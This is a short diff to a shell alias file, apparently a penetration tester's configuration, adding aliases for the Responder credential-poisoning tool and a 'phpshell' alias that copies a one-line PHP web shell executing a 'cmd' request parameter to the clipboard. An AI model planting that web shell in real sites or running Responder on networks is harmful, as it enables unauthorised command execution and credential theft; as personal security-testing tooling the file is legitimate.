@@ -17,4 +17,6 @@ alias runsmbserv='echo "net use Z: \\\\$(ip a sh dev tun0 | grep -oP "(?:[0-9]{1
 alias ssh2john='/opt/tools/john/run/ssh2john.py'
 alias scan='python3 /opt/resources/scan.py'
 alias getdns='bash /opt/tools/dnsvalidator/getdns.sh'
-alias cat='glow -p'
+alias cat='glow '
+alias responder='sudo responder -I eth0 -wFb'
+alias phpshell='echo "<?php system(\$_GET[\'cmd\']); ?>" | xclip -selection clipboard && echo "Shell PHP copié !"'
